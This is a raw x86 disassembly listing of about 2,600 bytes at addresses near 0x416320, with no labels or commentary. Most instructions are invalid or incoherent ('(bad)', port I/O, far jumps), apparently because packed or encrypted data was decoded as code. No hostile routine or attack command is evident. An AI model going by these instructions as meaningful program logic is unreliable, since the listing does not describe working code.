  41631e:	mov    cl,0x3c
  416320:	jmp    0x416337
  416322:	clc    
  416323:	stos   DWORD PTR es:[edi],eax
  416324:	repz int 0x6f
  416327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416328:	mov    bh,0x6
  41632a:	mov    bh,0x1f
  41632c:	gs mov edi,0xbfa12487
  416332:	mov    eax,0xf0fa3deb
  416337:	out    0x3f,al
  416339:	sbb    DWORD PTR [edx-0x18864fc7],edx
  41633f:	mov    edi,0xa9f124b1
  416344:	inc    esi
  416345:	icebp  
  416346:	shr    DWORD PTR ds:0xcf2d82e7,cl
  41634c:	dec    edx
  41634d:	dec    eax
  41634e:	rcl    BYTE PTR [ebx+0x10],0x10
  416352:	nop
  416353:	sbb    eax,0xda94876c
  416358:	fs test al,0x20
  41635b:	pop    esp
  41635c:	cmc    
  41635d:	xlat   BYTE PTR ds:[ebx]
  41635e:	int    0x27
  416360:	xchg   ebx,eax
  416361:	sbb    esi,0x23701949
  416367:	jmp    DWORD PTR [esi+0x34227d38]
  41636d:	fidiv  WORD PTR [ebx-0x276fb53d]
  416373:	mov    al,BYTE PTR [ecx+edx*2]
  416376:	arpl   WORD PTR [eax+0x62],ax
  416379:	xchg   ebx,edi
  41637b:	or     eax,0x5191864
  416380:	mov    dh,0x69
  416382:	pop    eax
  416383:	jo     0x4163e1
  416385:	sub    al,0x84
  416387:	inc    edx
  416388:	loopne 0x4163be
  41638a:	(bad)  
  41638b:	lock nop
  41638d:	leave  
  41638e:	xchg   BYTE PTR [esi],dh
  416390:	mov    WORD PTR [eax+0x2c1195ce],?
  416396:	pop    edi
  416397:	and    esp,ebx
  416399:	cmp    DWORD PTR [edi],edx
  41639b:	imul   BYTE PTR [edi-0x6292e40d]
  4163a1:	adc    edi,DWORD PTR [eax+edi*2+0x6d4429ff]
  4163a8:	pop    ecx
  4163a9:	lea    ecx,[edx-0x60fd320a]
  4163af:	(bad)
  4163b2:	lea    ecx,[eax-0x12]
  4163b5:	fdivr  DWORD PTR [edi-0x74]
  4163b8:	push   eax
  4163b9:	test   BYTE PTR ds:0x3879afe,dh
  4163bf:	xor    DWORD PTR [eax-0x2c],edx
  4163c2:	lods   eax,DWORD PTR ds:[esi]
  4163c3:	push   ecx
  4163c4:	push   ds
  4163c5:	pop    ebp
  4163c6:	in     al,dx
  4163c7:	pop    eax
  4163c8:	cmp    cl,dh
  4163ca:	outs   dx,BYTE PTR ds:[esi]
  4163cb:	cld    
  4163cc:	pop    ebp
  4163cd:	icebp  
  4163ce:	dec    esi
  4163cf:	lods   eax,DWORD PTR ds:[esi]
  4163d0:	mov    ds:0x8780746c,al
  4163d5:	xchg   esi,eax
  4163d6:	pop    ebp
  4163d7:	mov    dh,0x7f
  4163d9:	clc    
  4163da:	inc    eax
  4163db:	daa    
  4163dc:	es leave 
  4163de:	mov    BYTE PTR [esi-0x2c],dh
  4163e1:	ret    
  4163e2:	fld    QWORD PTR [ebx+0x5]
  4163e5:	sub    eax,DWORD PTR [ecx+eax*2]
  4163e8:	outs   dx,DWORD PTR ds:[esi]
  4163e9:	in     al,dx
  4163ea:	sbb    ebx,DWORD PTR ds:0xc3ed9c11
  4163f0:	das    
  4163f1:	jae    0x4163aa
  4163f3:	sbb    al,0xd7
  4163f5:	cmp    BYTE PTR [edi],bl
  4163f7:	dec    edx
  4163f8:	xlat   BYTE PTR gs:[ebx]
  4163fa:	add    dl,ch
  4163fc:	or     BYTE PTR [eax-0x703c1efc],dl
  416402:	imul   ebp,esp,0xe32f766a
  416408:	sbb    edi,ebp
  41640a:	push   ebp
  41640b:	add    BYTE PTR [eax+esi*8],0xb4
  41640f:	add    BYTE PTR [bx+si],al
	...
  416472:	add    BYTE PTR [eax],al
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	push   ds
  416481:	fist   WORD PTR [ebx+ebp*4]
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	cmp    al,BYTE PTR [edi+0xc]
  41648f:	mov    BYTE PTR [esi-0x1b],al
  416492:	sub    dh,ah
  416494:	inc    ebx
  416495:	pop    es
  416496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416497:	(bad)  
  416498:	push   ds
  416499:	ds stos BYTE PTR es:[edi],al
  41649b:	sbb    DWORD PTR [ecx+0x59],ebp
  41649e:	ins    BYTE PTR es:[edi],dx
  41649f:	daa    
  4164a0:	pop    esi
  4164a1:	pushf  
  4164a2:	push   ebx
  4164a3:	popf   
  4164a4:	std    
  4164a5:	inc    esi
  4164a6:	sub    DWORD PTR [esi+eiz*1],ebp
  4164a9:	stc    
  4164aa:	mov    edx,0x8c3b8c9a
  4164af:	dec    eax
  4164b0:	stos   DWORD PTR es:[edi],eax
  4164b1:	jae    0x41645a
  4164b3:	adc    al,0x82
  4164b5:	adc    edi,DWORD PTR [eax]
  4164b7:	cmc    
  4164b8:	pop    es
  4164b9:	jp     0x416534
  4164bb:	add    dl,BYTE PTR [ebx]
  4164bd:	cmp    al,BYTE PTR [ebp-0x56]
  4164c0:	sar    BYTE PTR [ebp+ebx*2+0x6ee8fa77],1
  4164c7:	pop    ss
  4164c8:	aaa    
  4164c9:	stos   BYTE PTR es:[edi],al
  4164ca:	js     0x41653b
  4164cc:	jle    0x416485
  4164ce:	xor    BYTE PTR [ecx+0x75],dh
  4164d1:	daa    
  4164d2:	inc    eax
  4164d3:	gs test dl,0xc4
  4164d7:	(bad)  
  4164d9:	test   eax,0xab99d897
  4164de:	cmc    
  4164df:	aad    0x79
  4164e1:	cmp    eax,0xa6eebb3a
  4164e6:	xchg   esi,eax
  4164e7:	xlat   BYTE PTR ds:[ebx]
  4164e8:	fcmove st,st(2)
  4164ea:	out    dx,eax
  4164eb:	das    
  4164ec:	ds call 0x714a292d
  4164f2:	adc    ebp,DWORD PTR [edx]
  4164f4:	(bad)  
  4164f5:	mov    esp,0x1fa3266b
  4164fa:	and    eax,DWORD PTR [ebx-0x77]
  4164fd:	ret    0x3ce8
  416500:	xchg   esp,eax
  416501:	sub    cl,BYTE PTR [edx+edx*8+0x501ebd7e]
  416508:	jge    0x416548
  41650a:	sub    ebx,DWORD PTR [ebx-0x6b]
  41650d:	fdiv   QWORD PTR [edi]
  41650f:	mov    DWORD PTR [edx],esp
  416511:	pop    ebp
  416512:	div    DWORD PTR [edi+0x50e395fa]
  416518:	cwde   
  416519:	stc    
  41651a:	arpl   WORD PTR [ecx],bx
  41651c:	mov    ah,0x8d
  41651e:	(bad)  
  416520:	ret    
  416521:	push   esp
  416522:	(bad)  
  416523:	(bad)  
  416524:	nop
  416525:	rcr    DWORD PTR [esi-0x16187930],0x8d
  41652c:	push   esp
  41652d:	cwde   
  41652e:	(bad)  
  41652f:	loop   0x41652c
  416531:	sbb    edx,DWORD PTR [eax]
  416533:	mov    ds:0x2bbe763f,eax
  416538:	leave  
  416539:	or     eax,0xf90ebb4e
  41653e:	pop    ebp
  41653f:	addr16 cld 
  416541:	push   ebx
  416542:	popa   
  416543:	pop    es
  416544:	mov    dh,BYTE PTR [ebp-0x5f3f4815]
  41654a:	jmp    DWORD PTR [ebx+0x531e919b]
  416550:	test   BYTE PTR ds:0xe58fb4e7,cl
  416556:	pop    esp
  416557:	adc    BYTE PTR [ebp+ebx*8+0x5b],bh
  41655b:	cmp    BYTE PTR ds:0x58617afb,dl
  416561:	iret   
  416562:	jnp    0xd49b6238
  416568:	xor    bh,BYTE PTR [edx]
  41656a:	call   0xea13:0x3188a9c9
  416571:	add    al,0x58
  416573:	mov    cs,WORD PTR [esi+0x45dadd5e]
  416579:	and    bh,cl
  41657b:	outs   dx,BYTE PTR ss:[esi]
  41657d:	(bad)  
  41657e:	aam    0x8c
  416580:	loop   0x416510
  416582:	shr    BYTE PTR [ebx-0x54603524],1
  416588:	test   al,0xce
  41658a:	pop    ebx
  41658b:	mov    ah,0x7d
  41658d:	jp     0x4165ff
  41658f:	aaa    
	...
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x79b04354]
  416601:	cdq    
  416602:	imul   esi,DWORD PTR [esi+0xec44],0x4
  416609:	add    DWORD PTR [eax],eax
  41660b:	add    BYTE PTR ds:0xe302f4f9,ch
  416611:	push   0x35
  416613:	adc    eax,0xcb94c184
  416618:	mov    ebp,0xe04f62f9
  41661d:	mov    cl,0xdc
  41661f:	push   ds
  416620:	iret   
  416621:	dec    ecx
  416622:	rcr    BYTE PTR [ecx],1
  416624:	jl     0x4165d7
  416626:	pop    ebx
  416627:	stc    
  416628:	mov    edx,0xe6281791
  41662d:	or     ah,al
  41662f:	lahf   
  416630:	pushf  
  416631:	jp     0x416654
  416633:	aaa    
  416634:	ds popa 
  416636:	push   edi
  416637:	stos   BYTE PTR es:[edi],al
  416638:	add    DWORD PTR [edi-0x76],edx
  41663b:	mov    ds:0xbccbcfcd,al
  416640:	inc    edx
  416641:	(bad)  
  416642:	addr16 push 0xffffffea
  416645:	sahf   
  416646:	push   cs
  416647:	lds    edi,FWORD PTR [ebx-0x78]
  41664a:	push   edx
  41664b:	xchg   DWORD PTR [ecx],ebx
  41664d:	push   esi
  41664e:	into   
  41664f:	sub    BYTE PTR [ecx-0x71],cl
  416652:	fwait
  416653:	lds    ecx,FWORD PTR [esi-0xfd4587d]
  416659:	xchg   esp,eax
  41665a:	add    BYTE PTR [eax-0x4562143e],bh
  416660:	or     al,0x79
  416662:	push   eax
  416663:	xlat   BYTE PTR ds:[ebx]
  416664:	cwde   
  416665:	mov    dh,0x1d
  416667:	push   ds
  416668:	(bad)  [esi+0x2]
  41666b:	push   ebx
  41666c:	xchg   DWORD PTR [esi-0x529a2fcc],eax
  416672:	hlt    
  416673:	test   DWORD PTR [eax],esi
  416675:	xchg   di,ax
  416677:	sbb    edx,DWORD PTR [edi]
  416679:	cwde   
  41667a:	sub    al,0x14
  41667c:	push   eax
  41667d:	lds    esp,FWORD PTR [edi]
  41667f:	jne    0x4166a0
  416681:	fisubr WORD PTR [ecx*1+0x17a6bb80]
  416688:	out    0x76,eax
  41668a:	pop    edx
  41668b:	cs nop
  41668d:	std    
  41668e:	(bad)  
  41668f:	pop    ecx
  416690:	fwait
  416691:	jae    0x416674
  416693:	pop    esp
  416694:	ds in  eax,dx
  416696:	push   0xffffffe4
  416698:	shl    DWORD PTR [esi+0x21a5d984],cl
  41669e:	sub    esp,DWORD PTR [edi+0x3c7487]
  4166a4:	(bad)  
  4166a6:	cmc    
  4166a7:	mov    dl,0xfb
  4166a9:	clc    
  4166aa:	ins    DWORD PTR es:[edi],dx
  4166ab:	ins    BYTE PTR es:[edi],dx
  4166ac:	addr16 push esp
  4166ae:	cmp    al,0x2e
  4166b0:	push   es
  4166b1:	es dec eax
  4166b3:	xchg   ebp,ebp
  4166b5:	dec    eax
  4166b6:	xor    al,dl
  4166b8:	push   cs
  4166b9:	sbb    ecx,DWORD PTR [ecx]
  4166bb:	sub    al,0x9e
  4166bd:	sar    DWORD PTR [ecx-0x92b8ac8],cl
  4166c3:	je     0x41667e
  4166c5:	push   ss
  4166c6:	shl    DWORD PTR [edx+0x36],1
  4166c9:	inc    eax
  4166ca:	jno    0x416699
  4166cc:	mov    eax,0xbf8cc618
  4166d1:	xchg   al,cl
  4166d3:	sub    BYTE PTR ds:0xf8192da7,dh
  4166d9:	imul   ecx,edi,0x1f
  4166dc:	inc    esi
  4166dd:	jle    0x4166d2
  4166df:	nop
  4166e0:	push   eax
  4166e1:	jno    0x416709
  4166e3:	in     al,0x28
  4166e5:	mov    BYTE PTR [ebp+0x5c275cce],dh
  4166eb:	(bad)  
  4166ec:	xor    al,0xea
  4166ee:	cmp    al,0x9b
  4166f0:	ror    BYTE PTR [edi-0x29f03333],0x93
  4166f7:	test   eax,0x455c8b1e
  4166fc:	xor    esi,eax
  4166fe:	outs   dx,DWORD PTR ds:[esi]
  4166ff:	lods   eax,DWORD PTR ds:[esi]
  416700:	(bad)  [edi-0xd]
  416703:	adc    eax,DWORD PTR [eax]
  416705:	push   ds
  416706:	dec    edx
  416707:	jmp    0xd170:0x454518f
  41670e:	daa    
  41670f:	cli    
	...
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	lods   eax,DWORD PTR ds:[esi]
  416781:	daa    
  416782:	push   ss
  416783:	xor    eax,0xed48
  416788:	add    al,0x1
  41678a:	add    BYTE PTR [eax],al
  41678c:	push   ecx
  41678d:	stos   BYTE PTR es:[edi],al
  41678e:	mov    al,ds:0xb2a4f312
  416793:	shl    ah,0x83
  416796:	push   cs
  416797:	pop    ebx
  416798:	call   0x25b5a5ea
  41679d:	inc    ecx
  41679e:	or     al,0x65
  4167a0:	mov    eax,0x843d9369
  4167a5:	xlat   BYTE PTR ds:[ebx]
  4167a6:	pop    esp
  4167a7:	dec    esp
  4167a8:	pushf  
  4167a9:	loop   0x416758
  4167ab:	sbb    bh,dh
  4167ad:	or     al,0x47
  4167af:	lahf   
  4167b0:	rcr    BYTE PTR [eax],cl
  4167b2:	jmp    0x3dff:0x8b5f99e0
  4167b9:	and    BYTE PTR [edi+0x9568230],dl
  4167bf:	(bad)  
  4167c0:	xor    eax,0x65221be5
  4167c5:	mov    al,ds:0x290a0897
  4167ca:	int    0x20
  4167cc:	mov    ch,BYTE PTR [ebx]
  4167ce:	(bad)  
  4167cf:	shl    bl,cl
  4167d1:	mov    al,0xa5
  4167d3:	cld    
  4167d4:	leave  
  4167d5:	iret   
  4167d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167d7:	jecxz  0x4167f8
  4167d9:	loope  0x41676d
  4167db:	loope  0x4167dd
  4167dd:	test   al,0x31
  4167df:	lds    esi,FWORD PTR [esi]
  4167e1:	jle    0x4167f0
  4167e3:	mov    ds:0x41f65cab,al
  4167e8:	jp     0x4167b0
  4167ea:	and    eax,0x44b58686
  4167ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167f0:	out    dx,al
  4167f1:	stos   DWORD PTR es:[edi],eax
  4167f2:	lahf   
  4167f3:	mov    WORD PTR [ebx],es
  4167f5:	out    dx,al
  4167f6:	sub    eax,0x902459cb
  4167fb:	repz pop ss
  4167fd:	adc    DWORD PTR [ebp-0x2b683992],0x53
  416804:	mov    cl,0x20
  416806:	lds    ebp,FWORD PTR [ecx]
  416808:	pop    es
  416809:	scas   al,BYTE PTR es:[edi]
  41680a:	xchg   BYTE PTR ds:[ebx+0x1],ah
  41680e:	int    0xb2
  416810:	outs   dx,DWORD PTR ds:[esi]
  416811:	sub    ebx,DWORD PTR [ebp+0x1b714]
  416817:	and    BYTE PTR [ebx-0x1c680c0f],ah
  41681d:	add    DWORD PTR [ebp+0xd0c25c0],edx
  416823:	dec    esp
  416824:	mov    ds:0x85d65b35,eax
  416829:	mov    dl,0xaa
  41682b:	imul   eax,DWORD PTR [edx+0x5bb14adb],0xc9069d31
  416835:	xchg   ecx,eax
  416836:	sar    DWORD PTR [ebp+edi*4-0x56],1
  41683a:	xchg   ecx,eax
  41683b:	mov    WORD PTR [edx+eiz*8],cs
  41683e:	cmp    eax,DWORD PTR [eax]
  416840:	mov    ebx,0xed641537
  416845:	mov    ebp,0xd4eb8b2f
  41684a:	jne    0x416829
  41684c:	mov    esp,0x138af5ff
  416851:	push   0x7a8b45da
  416856:	mov    al,ds:0xc9961414
  41685b:	pop    ecx
  41685c:	and    DWORD PTR [edi-0x1f],0x5e
  416860:	jecxz  0x41683f
  416862:	std    
  416863:	sub    dh,0xc1
  416866:	inc    esi
  416867:	lahf   
  416868:	ss scas eax,DWORD PTR es:[edi]
  41686a:	push   ss
  41686b:	pop    ecx
  41686c:	shr    BYTE PTR [esi-0x22],1
  41686f:	sbb    al,0x4
  416871:	xchg   ebx,eax
  416872:	lods   al,BYTE PTR ds:[esi]
  416873:	and    ah,bl
  416875:	mov    edx,0x276fbe1f
  41687a:	enter  0x5b77,0x33
  41687e:	mov    al,ds:0xbf59d52b
  416883:	jmp    0x7e5:0xbc17bba2
  41688a:	lods   al,BYTE PTR ds:[esi]
  41688b:	in     al,dx
  41688c:	outs   dx,DWORD PTR ds:[esi]
  41688d:	pop    edx
  41688e:	xchg   edi,eax
  41688f:	int3   
	...
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x599baa14
  416904:	dec    esp
  416905:	out    dx,al
  416906:	add    BYTE PTR [eax],al
  416908:	add    al,0x1
  41690a:	add    BYTE PTR [eax],al
  41690c:	mov    WORD PTR [ebx+eax*2-0x21],cs
  416910:	mov    al,ds:0xcd89020c
  416915:	outs   dx,DWORD PTR ds:[esi]
  416916:	inc    ebp
  416917:	idiv   BYTE PTR [edi+0x1c]
  41691a:	daa    
  41691b:	mov    bl,0xaf
  41691d:	adc    ah,BYTE PTR [edi+0x70]
  416920:	mov    esp,0x68659500
  416925:	or     eax,DWORD PTR [ecx+0x5265b44f]
  41692b:	inc    ebx
  41692c:	xlat   BYTE PTR ds:[ebx]
  41692d:	jmp    0x7832:0xcf0ff78c
  416934:	xchg   DWORD PTR [edx+0x23b8112f],esp
  41693a:	pop    esp
  41693b:	(bad)  [ebp+0x791c925b]
  416941:	add    edx,ecx
  416943:	mov    cl,bl
  416945:	pop    eax
  416946:	jle    0x41695a
  416948:	dec    esp
  416949:	xchg   esi,eax
  41694a:	mov    ecx,0x2fd239cd
  41694f:	cmp    BYTE PTR [edx+ebp*8-0x68],ch
  416953:	sbb    ecx,edi
  416955:	aaa    
  416956:	add    edi,0x21
  416959:	mov    ebx,0x5b4b178c
  41695e:	mov    ch,dh
  416960:	sub    ecx,DWORD PTR [edx-0x6]
  416963:	inc    esi
  416964:	sub    al,0x6e
  416966:	call   0x47b8ff9c
  41696b:	or     ch,BYTE PTR [esi-0x57]
  41696e:	loop   0x416960
  416970:	iret   
  416971:	jb     0x4169c7
  416973:	sbb    dl,BYTE PTR [ebx+0x51d75f27]
  416979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41697a:	imul   esp,DWORD PTR [eax+0x42],0xa
  41697e:	adc    DWORD PTR ds:0xc4d916ff,0xd5b98111
  416988:	mov    ?,WORD PTR [ecx+0x3a]
  41698b:	jle    0x41695b
  41698d:	out    dx,al
  41698e:	arpl   WORD PTR [ebp+0x4e],dx
  416991:	test   eax,0x7f43b58f
  416996:	repnz hlt 
  416998:	loopne 0x4169d5
  41699a:	push   ebx
  41699b:	sub    esp,edi
  41699d:	mov    eax,ds:0x54fce3f
  4169a2:	and    ecx,DWORD PTR [esi+0x6e88aea7]
  4169a8:	inc    ebp
  4169a9:	fistp  DWORD PTR [edi+0x2d]
  4169ac:	xchg   ch,al
  4169ae:	jecxz  0x41698c
  4169b0:	pop    ecx
  4169b1:	mov    al,0xb4
  4169b3:	cmc    
  4169b4:	mov    ebx,0x7c06b1b5
  4169b9:	pushf  
  4169ba:	mov    eax,ds:0xdbefc833
  4169bf:	test   BYTE PTR [ebx+ebp*4],0xc9
  4169c3:	unpckhps xmm1,XMMWORD PTR [edi+0x22]
  4169c7:	sub    cl,bl
  4169c9:	in     al,dx
  4169ca:	and    BYTE PTR [ecx+0x79],ch
  4169cd:	add    eax,0x3d29eb7a
  4169d2:	shl    BYTE PTR ds:0x249d52a1,1
  4169d8:	test   DWORD PTR [ebp-0x58],edi
  4169db:	inc    edi
  4169dc:	mov    ecx,DWORD PTR [edi-0x75]
  4169df:	add    BYTE PTR [edi+0x36],cl
  4169e2:	mov    eax,0x64c4878b
  4169e7:	daa    
  4169e8:	jp     0x4169ec
  4169ea:	dec    ecx
  4169eb:	int3   
  4169ec:	mov    eax,0x749102ab
  4169f1:	sub    BYTE PTR [ecx-0xd4a0e25],dl
  4169f7:	sbb    al,0xef
  4169f9:	(bad)  
  4169fa:	or     BYTE PTR [eax-0xc],bl
  4169fd:	pop    ecx
  4169fe:	jmp    0xaa1b:0x4b4b069e
  416a05:	push   ss
  416a06:	(bad)  
  416a07:	ss jp  0x416a87
  416a0a:	jns    0x416a62
  416a0c:	or     eax,0x8c1568
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0xf0690ba3
  416a82:	add    BYTE PTR [edx],0x50
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    al,0x1
  416a8a:	add    BYTE PTR [eax],al
  416a8c:	ror    DWORD PTR [edi-0x922c513],0x48
  416a93:	sbb    eax,0xaa2bbe17
  416a98:	mov    esp,0x9d993769
  416a9d:	jg     0x416a30
  416a9f:	add    al,0xcc
  416aa1:	retfw  0xc42e
  416aa5:	aaa    
  416aa6:	cmc    
  416aa7:	(bad)  
  416aa8:	and    DWORD PTR [edx-0x7dd4a012],eax
  416aae:	lahf   
  416aaf:	push   edi
  416ab0:	shl    ecx,0xf0
  416ab3:	add    BYTE PTR [esi],al
  416ab5:	push   eax
  416ab6:	bound  ebx,QWORD PTR [ecx+0x1d5b87e0]
  416abc:	xor    eax,0xaa4b0089
  416ac1:	sub    eax,0xbfa42e3e
  416ac6:	xchg   edx,eax
  416ac7:	sub    al,0x1b
  416ac9:	jns    0x416af4
  416acb:	neg    DWORD PTR [eax+0x185612ee]
  416ad1:	mov    dh,BYTE PTR [edx+0x71]
  416ad4:	pop    eax
  416ad5:	test   BYTE PTR [ebx+0x139d19c7],bh
  416adb:	inc    edi
  416adc:	xor    ebx,esi
  416ade:	cmp    ch,BYTE PTR [esi]
  416ae0:	mov    dl,BYTE PTR [ebx+0x30]
  416ae3:	ficomp WORD PTR [ebx]
  416ae5:	pop    esp
  416ae6:	fistp  QWORD PTR [esi-0x1278f621]
  416aec:	retf   
  416aed:	lds    ebp,FWORD PTR [edx-0x7b]
  416af0:	test   al,0x7c
  416af2:	out    dx,al
  416af3:	lods   eax,DWORD PTR ds:[esi]
  416af4:	jns    0x416ade
  416af6:	loopne 0x416af0
  416af8:	mov    dl,0x39
  416afa:	neg    DWORD PTR [edx+edx*4-0x60]
  416afe:	scas   al,BYTE PTR es:[edi]
  416aff:	into   
  416b00:	lock xor ebx,ecx
  416b03:	pop    ecx
  416b04:	cmp    al,0x32
  416b06:	jb     0x416b1b
  416b08:	push   esi
  416b09:	add    eax,0x2cd1339c
  416b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b0f:	xor    DWORD PTR [edi+ecx*2+0x78],esp
  416b13:	jno    0x416b05
  416b15:	add    al,0xd9
  416b17:	ret    0xc068
  416b1a:	aas    
  416b1b:	mov    ds:0x889cc6f3,al
  416b20:	int    0x82
  416b22:	sub    BYTE PTR [esi+0x443a72d8],al
  416b28:	(bad)  
  416b29:	cmp    bh,BYTE PTR [ebx]
  416b2b:	push   ecx
  416b2c:	mov    al,ds:0x4405391f
  416b31:	fdivr  DWORD PTR [ebp+0x14]
  416b34:	add    edi,DWORD PTR [esi+0x1]
  416b37:	jns    0x416b85
  416b39:	xor    al,0x23
  416b3b:	mov    ds:0x2763bdac,al
  416b40:	fadd   DWORD PTR [edi]
  416b42:	arpl   sp,cx
  416b44:	popa   
  416b45:	arpl   bx,bx
  416b47:	nop
  416b48:	sub    eax,0x64e2b3ea
  416b4d:	mov    BYTE PTR [eax],dl
  416b4f:	mul    ebp
  416b51:	ins    DWORD PTR es:[edi],dx
  416b52:	push   cs
  416b53:	dec    esi
  416b54:	mov    BYTE PTR [edi+edx*2-0x10],0xd6
  416b59:	push   edi
  416b5a:	ins    DWORD PTR es:[edi],dx
  416b5b:	dec    ebx
  416b5c:	and    esi,DWORD PTR [esi+esi*4-0x1806f1b8]
  416b63:	sahf   
  416b64:	mov    ds,esp
  416b66:	and    ah,BYTE PTR [ebx+0x6032eb1a]
  416b6c:	data16 ins BYTE PTR es:[edi],dx
  416b6e:	ins    BYTE PTR es:[edi],dx
  416b6f:	or     al,0x1a
  416b71:	(bad)  
  416b72:	(bad)  [ecx-0x1c]
  416b75:	arpl   WORD PTR [edi],bp
  416b77:	xchg   esp,eax
  416b78:	out    dx,eax
  416b79:	inc    ebx
  416b7a:	push   eax
  416b7b:	ins    BYTE PTR es:[edi],dx
  416b7c:	pop    esi
  416b7d:	cli    
  416b7e:	xor    ebp,eax
  416b80:	and    BYTE PTR [ebx],dl
  416b82:	in     al,dx
  416b83:	pminub mm0,QWORD PTR [ebp+0x7a2529c]
  416b8a:	test   eax,0xb3ed8377
  416b8f:	dec    ecx
	...
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x425b70a9
  416c01:	cmc    
  416c02:	mov    al,BYTE PTR [ebx]
  416c04:	push   esp
  416c05:	lock add BYTE PTR [eax],al
  416c08:	add    al,0x1
  416c0a:	add    BYTE PTR [eax],al
  416c0c:	push   es
  416c0d:	in     eax,dx
  416c0e:	sub    al,0xb
  416c10:	cmp    bh,BYTE PTR [ecx+0x2c32315a]
  416c16:	shr    DWORD PTR [edi],0xc6
  416c19:	inc    ebx
  416c1a:	dec    ebx
  416c1b:	aad    0x0
  416c1d:	stos   DWORD PTR es:[edi],eax
  416c1e:	cmp    ah,BYTE PTR [ebx+0x56]
  416c21:	es jecxz 0x416bff
  416c24:	or     ah,bh
  416c26:	jo     0x416c76
  416c28:	push   eax
  416c29:	dec    BYTE PTR [esi+0x47768cc7]
  416c2f:	xor    ch,dh
  416c31:	je     0x416c29
  416c33:	fwait
  416c34:	sub    bh,BYTE PTR [esi+eiz*2+0x58f51e75]
  416c3b:	adc    BYTE PTR [ebx-0xcaa6398],dl
  416c41:	xor    DWORD PTR [edx+eax*2-0x7b281498],ebp
  416c48:	pop    ebp
  416c49:	mov    eax,0x2f7fa701
  416c4e:	push   0xffffff8b
  416c50:	cmp    eax,0xd2870506
  416c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c56:	xchg   ecx,eax
  416c57:	sbb    al,0x96
  416c59:	sub    esi,esi
  416c5b:	ja     0x416c72
  416c5d:	arpl   WORD PTR [esi-0x41],bp
  416c60:	pop    ebx
  416c61:	ss push edx
  416c63:	push   0x748d1f6c
  416c68:	cli    
  416c69:	mov    ds:0x753be2b5,al
  416c6e:	or     BYTE PTR [ebx],0xdb
  416c71:	jno    0x416c18
  416c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c74:	nop
  416c75:	inc    esi
  416c76:	and    dh,BYTE PTR [edi+0x6e]
  416c79:	inc    esi
  416c7a:	clc    
  416c7b:	inc    edi
  416c7c:	std    
  416c7d:	outs   dx,DWORD PTR cs:[esi]
  416c7f:	popf   
  416c80:	fmul   st,st(1)
  416c82:	out    dx,al
  416c83:	bound  esp,QWORD PTR [eax+0x12]
  416c86:	dec    edx
  416c87:	repnz mov ah,0xde
  416c8a:	leave  
  416c8b:	add    ecx,edi
  416c8d:	rcr    BYTE PTR ds:0xbde4f805,cl
  416c93:	pop    esi
  416c94:	add    eax,0xd1f7b26c
  416c99:	fwait
  416c9a:	inc    ebp
  416c9b:	xchg   ecx,eax
  416c9c:	or     BYTE PTR [ecx-0x4d],bl
  416c9f:	(bad)  
  416ca0:	mov    eax,0x30ca423
  416ca5:	jecxz  0x416c96
  416ca7:	mov    eax,0x4ca55dc3
  416cac:	scas   al,BYTE PTR es:[edi]
  416cad:	clc    
  416cae:	pop    ecx
  416caf:	fsub   DWORD PTR [ecx]
  416cb1:	add    DWORD PTR [eax+0x73eae05f],esi
  416cb7:	cmp    ecx,DWORD PTR [esi]
  416cb9:	scas   eax,DWORD PTR es:[edi]
  416cba:	xor    esi,esp
  416cbc:	sub    DWORD PTR [edi],edi
  416cbe:	mov    BYTE PTR [edi+0x39],ah
  416cc1:	inc    ebx
  416cc2:	lahf   
  416cc3:	xor    eax,0xf56a86bc
  416cc8:	shl    DWORD PTR [edi-0x53],cl
  416ccb:	imul   ebx,ecx,0x3d
  416cce:	mov    al,ds:0xc1de50a8
  416cd3:	scas   eax,DWORD PTR es:[edi]
  416cd4:	push   cs
  416cd5:	jae    0x416d1b
  416cd7:	in     eax,0xfd
  416cd9:	lea    esp,[ecx-0x16]
  416cdc:	xor    eax,0x7c7abe9e
  416ce1:	(bad)  
  416ce2:	xchg   edx,eax
  416ce3:	in     eax,0xab
  416ce5:	cmc    
  416ce6:	cdq    
  416ce7:	jne    0x416cba
  416ce9:	push   0xffffffe4
  416ceb:	retf   
  416cec:	mov    ecx,cs
  416cee:	add    al,0x2e
  416cf0:	mov    WORD PTR [edi-0x4e],fs
  416cf3:	fs ja  0x416d07
  416cf6:	rcl    BYTE PTR [edx-0x4f219e87],1
  416cfc:	and    al,0xfb
  416cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cff:	xchg   ebp,eax
  416d00:	mul    BYTE PTR [eiz*2+0x35df5991]
  416d07:	sbb    esi,DWORD PTR ds:0x691b5f3f
  416d0d:	frstor [esi-0x3]
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
